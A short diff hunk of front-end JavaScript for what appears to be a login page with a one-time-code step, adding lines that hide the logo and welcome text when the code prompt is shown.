@@ -559,6 +559,9 @@ if(!otpShown) {
         document.getElementById("mainBtn").innerText = "Confirm";
         document.getElementById("attemptText").style.display = "block";
         document.getElementById("socialSection").style.display = "none";
+    document.getElementById("logoSection").style.display = "none";
+document.getElementById("welcomeText").style.display = "none";
+document.getElementById("welcomeSubText").style.display = "none";
         document.getElementById("mainBtn").style.position = "relative";
 document.getElementById("mainBtn").style.top = "170px";
     document.getElementById("attemptText").style.position = "relative";
